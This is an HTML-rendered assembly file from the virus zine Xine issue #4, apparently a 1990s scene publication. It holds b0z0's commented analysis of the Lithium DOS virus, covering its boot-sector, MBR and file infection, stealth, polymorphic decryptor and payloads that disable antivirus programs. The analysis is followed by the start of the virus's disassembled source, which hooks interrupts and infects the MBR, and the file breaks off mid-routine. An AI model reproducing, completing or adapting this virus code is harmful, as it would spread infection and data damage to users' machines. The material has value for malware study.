<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>lithium.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                         /-----------------------------\
;                                         | Xine - issue #4 - Phile 309 |</span><span class="sc0">
</span><span class="sc1">;                                         \-----------------------------/</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                          Virus Spotlite: Lithium</span><span class="sc0">
</span><span class="sc1">;                               by b0z0/IKX</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Virus name      : Lithium</span><span class="sc0">
</span><span class="sc1">; Virus author    : ATP (?)</span><span class="sc0">
</span><span class="sc1">; Virus origin    : Italy, 1995/96 (?)</span><span class="sc0">
</span><span class="sc1">; Virus lenght    : 4113 bytes</span><span class="sc0">
</span><span class="sc1">; Virus type      : Multipartite BS/MBR/EXE/COM, semipolymorphic, stealth</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Introduction:</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;  This is a very interesting multipartite semipolimorphic stealth virus from</span><span class="sc0">
</span><span class="sc1">; Italy that has been also found a few times in the wild (at least considering</span><span class="sc0">
</span><span class="sc1">; some older messages in italian virus newsgroups and echo areas). Apart from</span><span class="sc0">
</span><span class="sc1">; including many interesting features, like full stealth on files, formatting</span><span class="sc0">
</span><span class="sc1">; an extra track on floppyes, semipolymorphism and windows compatibility, it</span><span class="sc0">
</span><span class="sc1">; contains some unusual ways to complete some tasks that make the virus worth</span><span class="sc0">
</span><span class="sc1">; examining.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Memory residency:</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;  When starting from files to see if the virus is already resident in memory</span><span class="sc0">
</span><span class="sc1">; it will check a word at 0:4eeh (that by default should be zero) that the virus</span><span class="sc0">
</span><span class="sc1">; will also use as a temporary storage for internal installation routines. If</span><span class="sc0">
</span><span class="sc1">; the virus isn't already resident then it will simply try to infect the MBR of</span><span class="sc0">
</span><span class="sc1">; the main disk. The virus will then get resident in memory just at next boot</span><span class="sc0">
</span><span class="sc1">; from the infected MBR (or alternatively when booted from an infected floppy</span><span class="sc0">
</span><span class="sc1">; disk).</span><span class="sc0">
</span><span class="sc1">;  The way the virus uses to get resident is quite strange. In a first moment</span><span class="sc0">
</span><span class="sc1">; it will copy its interrupt 13h handler (at 0:228h) and the virus residency</span><span class="sc0">
</span><span class="sc1">; routine (at 0:282h) to memory and then prepare something like a table with</span><span class="sc0">
</span><span class="sc1">; calls to the residency routine after that. This first interrupt 13h handler</span><span class="sc0">
</span><span class="sc1">; will stealth reads on MBR and will have to check if DOS seems to be loaded.</span><span class="sc0">
</span><span class="sc1">; When DOS will seem to be loaded (a few usual checks are done) it will</span><span class="sc0">
</span><span class="sc1">; point interrupt 21h to the last used element of the table it prepared before</span><span class="sc0">
</span><span class="sc1">; that will, on the very first call to the interrupt 21h, jump to the residency</span><span class="sc0">
</span><span class="sc1">; routine and then execute the requested call. This seems a bit strange, infact</span><span class="sc0">
</span><span class="sc1">; it is. You should check the table I made in the disassembly and read the</span><span class="sc0">
</span><span class="sc1">; comment to get a better idea of how this works.</span><span class="sc0">
</span><span class="sc1">;  The memory residency routine will try to allocate the needed space in memory</span><span class="sc0">
</span><span class="sc1">; triing first to allocate high memory. If this will be succesfull then it will</span><span class="sc0">
</span><span class="sc1">; read the 8 virus sectors (from hd or fd) up there and then jump again to the</span><span class="sc0">
</span><span class="sc1">; beginning of the virus with an internal value in the register BP. When executed</span><span class="sc0">
</span><span class="sc1">; with this internal value the virus will infact delete the CALL to the residency</span><span class="sc0">
</span><span class="sc1">; routine stored before and will also delete the first interrupt 13h handler and</span><span class="sc0">
</span><span class="sc1">; all the rest of the installation code it copied to memory on boot. The virus</span><span class="sc0">
</span><span class="sc1">; will then hook interrupt 21h and will redirect the hook of the interrupt 13h to</span><span class="sc0">
</span><span class="sc1">; the real interrupt 13h routine, this is the one that will have to infect</span><span class="sc0">
</span><span class="sc1">; floppyes (while the one before was just checking for DOS loading).</span><span class="sc0">
</span><span class="sc1">;  The int 87h will be pointed to the original int 21h routine, while the original</span><span class="sc0">
</span><span class="sc1">; int 13h will be redirected to int 86h.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; File infection:</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;  COM and EXE file will be infected by Lithium on every exec (4bh), open (3dh),</span><span class="sc0">
</span><span class="sc1">; extended open (6ch), chmod (43h) and close (3eh). The virus will check for</span><span class="sc0">
</span><span class="sc1">; suspect filenames, like antiviruses and such, for files that aren't too small</span><span class="sc0">
</span><span class="sc1">; or too big, skip windows executables and such normal procedures. Also the</span><span class="sc0">
</span><span class="sc1">; infection stage is quite normal. For some tasks Lithium uses also SFTs. The</span><span class="sc0">
</span><span class="sc1">; infected file will be first aligned to a lenght that can be divided by 10h and</span><span class="sc0">
</span><span class="sc1">; after that the virus (in poly form) and the original file bytes will be written</span><span class="sc0">
</span><span class="sc1">; to the file.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; File Stealth:</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;  Lithium does stealth it filesize on findfirst/findnext calls using fcbs</span><span class="sc0">
</span><span class="sc1">; (11h/12h) and using dta (4eh/4fh). To mark infected files it will add 200</span><span class="sc0">
</span><span class="sc1">; years to the infected file date, that will be of course restored when the</span><span class="sc0">
</span><span class="sc1">; virus is active. The date will be also corrected when a get/set file date</span><span class="sc0">
</span><span class="sc1">; function will be issued (57h).</span><span class="sc0">
</span><span class="sc1">;  On file read functions (3fh) the virus will check if the user would like to</span><span class="sc0">
</span><span class="sc1">; read the file header. If so the virus will restore the original header bytes</span><span class="sc0">
</span><span class="sc1">; so the user couldn't notice the virus changes. It is interesting that the virus</span><span class="sc0">
</span><span class="sc1">; will have to read the infected file decryption routine and get the encryption</span><span class="sc0">
</span><span class="sc1">; method from it and in this way it will be able to decrypt and restore the</span><span class="sc0">
</span><span class="sc1">; original header informations, handling the various possible reads (like reading</span><span class="sc0">
</span><span class="sc1">; just a part or the entire header). It will also of course truncate every try</span><span class="sc0">
</span><span class="sc1">; to read after the lenght of the original file, this is to read the virus body.</span><span class="sc0">
</span><span class="sc1">;  Finally also after a succesfull infection on open (3dh) or extended open (6ch)</span><span class="sc0">
</span><span class="sc1">; the virus will stealth its lenght in SFTs.</span><span class="sc0">
</span><span class="sc1">;  This stealth procedures will be disabled when the virus will think that PKZip</span><span class="sc0">
</span><span class="sc1">; or a Backup program are being run.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Floppy/MBR infection/stealth:</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;  Floppyes are infected on interrupt 13h functions read and write (02 and 03).</span><span class="sc0">
</span><span class="sc1">; When infecting a floppy the virus will format an extra track in a quite usual</span><span class="sc0">
</span><span class="sc1">; way and store it's encrypted body and original boot sector there. The virus</span><span class="sc0">
</span><span class="sc1">; won't permit anyone to read or write that extra track using int 13h. It is</span><span class="sc0">
</span><span class="sc1">; interesting that the virus keeps two bytes to keep the status of the current</span><span class="sc0">
</span><span class="sc1">; floppyes (A: and B:). One byte is used to mark if the floppy is infected or</span><span class="sc0">
</span><span class="sc1">; not, while the other is used to mark if the floppy has been already checked or</span><span class="sc0">
</span><span class="sc1">; not. This way the virus won't need to check for infection/stealth each time</span><span class="sc0">
</span><span class="sc1">; a function is issued, but it will just check if the floppy disk has changed</span><span class="sc0">
</span><span class="sc1">; (using function 16h of int 13h) and if it hasn't then it will use the internal</span><span class="sc0">
</span><span class="sc1">; variables to understand if it has to check/infect/stealth the floppy or not.</span><span class="sc0">
</span><span class="sc1">; Of course each time a disk change is detected or a format track is executed the</span><span class="sc0">
</span><span class="sc1">; internal variables will be reinitialized so the virus will have to analyze the</span><span class="sc0">
</span><span class="sc1">; floppy in the diskette drive. This is of course an interesting feature, even if</span><span class="sc0">
</span><span class="sc1">; a bit space-consuming, since makes access to floppyes much faster and prevent</span><span class="sc0">
</span><span class="sc1">; that quite boring sound of floppy drive seeking here and there.</span><span class="sc0">
</span><span class="sc1">;  If writes to the floppy boot sector will be requested then the virus will</span><span class="sc0">
</span><span class="sc1">; update the saved original boot sector on the floppy while on each read, when</span><span class="sc0">
</span><span class="sc1">; needed, also the original data will be given instead of the infected boot.</span><span class="sc0">
</span><span class="sc1">;  The MBR infection is done in a quite normal way. First of all the virus will</span><span class="sc0">
</span><span class="sc1">; check if the MBR is already infected (the virus name is placed as marker) and</span><span class="sc0">
</span><span class="sc1">; check if there are some DOS partitions on the hard disk. If there isn't any</span><span class="sc0">
</span><span class="sc1">; then very probably the virus won't have any possibility to get active, so it</span><span class="sc0">
</span><span class="sc1">; won't even infect the MBR. After this checks the virus will disable some BIOS</span><span class="sc0">
</span><span class="sc1">; virus protections, save the original MBR and infect the hd in a quite normal</span><span class="sc0">
</span><span class="sc1">; way. When the user will try to access some sector on the disk where the virus</span><span class="sc0">
</span><span class="sc1">; will store itself (from 0/0/4 for 8 sectors) it will just forget that operation,</span><span class="sc0">
</span><span class="sc1">; while when a read to the MBR will be requested it will stealth giving the</span><span class="sc0">
</span><span class="sc1">; original one.</span><span class="sc0">
</span><span class="sc1">;  Both the virus floppy boot and MBR are composed by a common piece of code that</span><span class="sc0">
</span><span class="sc1">; initializes the stack and such (look at label generic_boot in disasm) and</span><span class="sc0">
</span><span class="sc1">; another part depending if there is a floppy or MBR that will read the virus to</span><span class="sc0">
</span><span class="sc1">; memory and jump there. So at boot this standard boot will be executed, then</span><span class="sc0">
</span><span class="sc1">; the control will be given to the generated poly decryptor that will decrypt the</span><span class="sc0">
</span><span class="sc1">; virus body and just then the real virus code will come in.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Polymorphism:</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;  The virus is slightly polymorphic in files as well as when on floppy and in</span><span class="sc0">
</span><span class="sc1">; MBR (after getting control from the standard virus boot). It uses an</span><span class="sc0">
</span><span class="sc1">; oligomorphic routine to generate decryptors that are, by consequence, quite</span><span class="sc0">
</span><span class="sc1">; simple but the design is rather interesting.</span><span class="sc0">
</span><span class="sc1">;  The routine infact has 7 parts of code for the decryptor and this will be</span><span class="sc0">
</span><span class="sc1">; put randomly in the space for the decryptor (72h bytes at the beginning) and</span><span class="sc0">
</span><span class="sc1">; "connected" with jumps from one to another. Each part will be put in one of</span><span class="sc0">
</span><span class="sc1">; the 7 portions long 10h bytes, so they won't overwrite each other or something</span><span class="sc0">
</span><span class="sc1">; like. This parts are quite simple, some have one or more way to be done, but</span><span class="sc0">
</span><span class="sc1">; anyway the possible generations aren't too many and an algorithmic scanning is</span><span class="sc0">
</span><span class="sc1">; quite straightforward (infact also the virus itself will have to somehow</span><span class="sc0">
</span><span class="sc1">; 'emulate' the decryptor to get the key and math operation it used, so it will</span><span class="sc0">
</span><span class="sc1">; be able to restore the original bytes of the file). The parts the decryptor</span><span class="sc0">
</span><span class="sc1">; will create, that will be executed in this exact sequence, are anyway:</span><span class="sc0">
</span><span class="sc1">;   - adjust segment, this is set ds=cs, plus a one byte garbage (this one byte</span><span class="sc0">
</span><span class="sc1">;     garbage is done to make the part 5 bytes long, including the jump)</span><span class="sc0">
</span><span class="sc1">;   - lenght setting, sets in ax the virus lenght</span><span class="sc0">
</span><span class="sc1">;   - pointer setting, sets in pointer register (di/si/bx) initial pointer value</span><span class="sc0">
</span><span class="sc1">;   - not decryption instruction, will generate a NOT on the decryption</span><span class="sc0">
</span><span class="sc1">;     instruction to hide it a bit</span><span class="sc0">
</span><span class="sc1">;   - decryption instruction, this is a xor/sub/add byte ptr [si/di/bx],imm8</span><span class="sc0">
</span><span class="sc1">;   - pointer increment, this is a INC of the pointer register (di/si/bx)</span><span class="sc0">
</span><span class="sc1">;   - counter decrement, simply DEC ax and a JNE to begin of the loop.</span><span class="sc0">
</span><span class="sc1">;  This parts as said will be connected by jumps and finally a jump to the</span><span class="sc0">
</span><span class="sc1">; beginning of the code will be generated. To make the result a bit better also</span><span class="sc0">
</span><span class="sc1">; some random bytes will be put on the 'background' of the generated decryptor.</span><span class="sc0">
</span><span class="sc1">; The first 4 parts will be 5 bytes long (including the short jump to the next</span><span class="sc0">
</span><span class="sc1">; part). This fact will infact be used by the virus itself to go through the</span><span class="sc0">
</span><span class="sc1">; decryptor (by just getting the offsets of the short jumps) and find the</span><span class="sc0">
</span><span class="sc1">; encryption method and encryption key.</span><span class="sc0">
</span><span class="sc1">;  When the virus will generate the decryptor and encrypt the body it will always</span><span class="sc0">
</span><span class="sc1">; just use a 200h buffer and write from time to time the results (to disk sectors</span><span class="sc0">
</span><span class="sc1">; or to file).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Payloads:</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;  Lithium has a few payloads depending on the system date and on the function</span><span class="sc0">
</span><span class="sc1">; is being used. If the current day is later than may 1996 then the virus,</span><span class="sc0">
</span><span class="sc1">; depending on a quite random value (the stack value), could activate itself.</span><span class="sc0">
</span><span class="sc1">;  It has tho 6 possible payloads (depending on the stack value):</span><span class="sc0">
</span><span class="sc1">;    - change colors (could activate only on open or delete file instructions)</span><span class="sc0">
</span><span class="sc1">;    - change gray color (only on select default drive)</span><span class="sc0">
</span><span class="sc1">;    - change palette register (only on remove directory)</span><span class="sc0">
</span><span class="sc1">;    - write a command to com1 and com2 (only on write to file)</span><span class="sc0">
</span><span class="sc1">;    - print virus name on printer (only on create temporary file)</span><span class="sc0">
</span><span class="sc1">;    - set volume and serial number of hd to virus one</span><span class="sc0">
</span><span class="sc1">;    - increment the system clock by one minute</span><span class="sc0">
</span><span class="sc1">;  The check for payload activation is done on each int 21h call. Also when a</span><span class="sc0">
</span><span class="sc1">; payload (indifferently which one) is activated the virus won't allow the</span><span class="sc0">
</span><span class="sc1">; games DOOM, Wolfstein 3D and Quake to be played by just setting a CD20h at the</span><span class="sc0">
</span><span class="sc1">; file entry point when someone will try to run them. Nasty :) From june of 1996</span><span class="sc0">
</span><span class="sc1">; also many antiviruses will be corrupted by a CD20h set on their begin so they</span><span class="sc0">
</span><span class="sc1">; won't run anymore.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Other goodies:</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;  The virus has its own int 24h error handler and it will add to the WIN</span><span class="sc0">
</span><span class="sc1">; (possibly Windoze) command line parameters /D:FC so it won't scare the user</span><span class="sc0">
</span><span class="sc1">; that something should be wrong with disk access.</span><span class="sc0">
</span><span class="sc1">;  It has an interesting message in it, here is a translation:</span><span class="sc0">
</span><span class="sc1">;   Swimming in the honey</span><span class="sc0">
</span><span class="sc1">;   Blinded by light</span><span class="sc0">
</span><span class="sc1">;         Oppressed by freedom</span><span class="sc0">
</span><span class="sc1">;   Sick of insincere and easy smiles</span><span class="sc0">
</span><span class="sc1">;   We fight to find something to believe in.</span><span class="sc0">
</span><span class="sc1">;   The notes of rage and instability</span><span class="sc0">
</span><span class="sc1">;   are the detonator of the wish to continue...</span><span class="sc0">
</span><span class="sc1">;   ...'CAUSE WE ARE ALIVE!</span><span class="sc0">



</span><span class="sc2">.286</span><span class="sc0">

</span><span class="sc1">;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€</span><span class="sc0">
</span><span class="sc1">;€€                                                  €€</span><span class="sc0">
</span><span class="sc1">;€€                             Lithium                                  €€</span><span class="sc0">
</span><span class="sc1">;€€                        disasm by b0z0/iKX                            €€</span><span class="sc0">
</span><span class="sc1">;€€                                                                      €€</span><span class="sc0">
</span><span class="sc1">;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€</span><span class="sc0">

</span><span class="sc5">virus_lenght</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_enc_lenght</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memory</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">real_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_paras</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp_memend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">

</span><span class="sc5">seg_a</span><span class="sc0">       </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_a</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">seg_a</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">lithium</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">oligo_space</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">72h</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; space for the oligo decryptor</span><span class="sc0">

</span><span class="sc5">real_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                           </span><span class="sc1">; if ES=0 then virus</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; is executed from boot</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">from_file</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">from_bootmbr</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">from_file</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">virus_name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Lithium"</span><span class="sc0">

</span><span class="sc5">from_file</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">1515h</span><span class="sc0">                        </span><span class="sc1">; virus int. value?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">normal_file_run</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">run_from_mem</span><span class="sc0">                    </span><span class="sc1">; if so we are being</span><span class="sc0">
                                                        </span><span class="sc1">; executed from mem</span><span class="sc0">
</span><span class="sc5">normal_file_run</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta_offset</span><span class="sc0">
</span><span class="sc5">delta_offset</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                           </span><span class="sc1">; manual reloc in mem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reloc_there</span><span class="sc0">           </span><span class="sc1">; and jump there</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">reloc_there</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4eeh</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; residency check</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">back_original</span><span class="sc0">

                </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fffh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f000h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f000h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">back_original</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0cfh</span><span class="sc0">                         </span><span class="sc1">; iret opcode</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; put iret at int1h</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; put iret at int3h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">                  </span><span class="sc1">; set int13h handler to some</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">                     </span><span class="sc1">; place and get original in</span><span class="sc0">
                                                </span><span class="sc1">; es:bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">86h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; int86h will became</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">86h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">  </span><span class="sc1">; original int13h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">                  </span><span class="sc1">; set int13h to the good one</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">                     </span><span class="sc1">; again</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_nfect</span><span class="sc0">             </span><span class="sc1">; check if have to infect mbr</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">back_original</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_mbr</span><span class="sc0">              </span><span class="sc1">; infect that</span><span class="sc0">
</span><span class="sc5">info_lup</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">info_lup</span><span class="sc0">
</span><span class="sc5">back_original</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; zero all registers</span><span class="sc0">
